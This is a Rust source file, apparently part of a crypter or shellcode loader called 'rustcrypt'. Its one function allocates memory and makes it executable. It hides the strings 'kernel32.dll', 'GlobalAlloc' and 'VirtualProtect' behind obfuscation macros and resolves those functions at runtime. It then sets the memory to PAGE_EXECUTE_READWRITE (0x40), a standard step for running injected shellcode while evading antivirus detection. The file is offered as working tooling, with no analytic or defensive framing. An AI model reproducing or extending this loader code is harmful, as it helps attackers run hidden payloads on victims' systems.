use crate::utils::{load_library, get_proc_address};
pub unsafe fn alloc_mem(size: usize) -> Result<*mut u8, String> {
    use rustcrypt_ct_macros::{obf_lit, obf_lit_bytes};
    use core::ffi::c_void;

    type GlobalAllocFn = unsafe extern "system" fn(u_flags: u32, dw_bytes: usize) -> *mut c_void;
    type GlobalLockFn = unsafe extern "system" fn(h_mem: *mut c_void) -> *mut c_void;
    type VirtualProtectFn = unsafe extern "system" fn(lp_address: *mut c_void, dw_size: usize, fl_new_protect: u32, lpfl_old_protect: *mut u32) -> i32;

    let kernel32 = load_library(obf_lit_bytes!(b"kernel32.dll\0").as_slice())?;
    let global_alloc: GlobalAllocFn = core::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"GlobalAlloc\0").as_slice())?);
    let global_lock: GlobalLockFn = core::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"GlobalLock\0").as_slice())?);
    let virtual_protect: VirtualProtectFn = core::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"VirtualProtect\0").as_slice())?);

    let h_mem = global_alloc(0x0042, size);
    if h_mem.is_null() {
        return Err(obf_lit!("GlobalAlloc failed").to_string());
    }

    let p = global_lock(h_mem);
    if p.is_null() {
        return Err(obf_lit!("GlobalLock failed").to_string());
    }

    let mut old_protect = 0u32;
    let ok = virtual_protect(p, size, 0x40, &mut old_protect);
    if ok == 0 {
        return Err(obf_lit!("VirtualProtect failed").to_string());
    }

    Ok(p as *mut u8)
}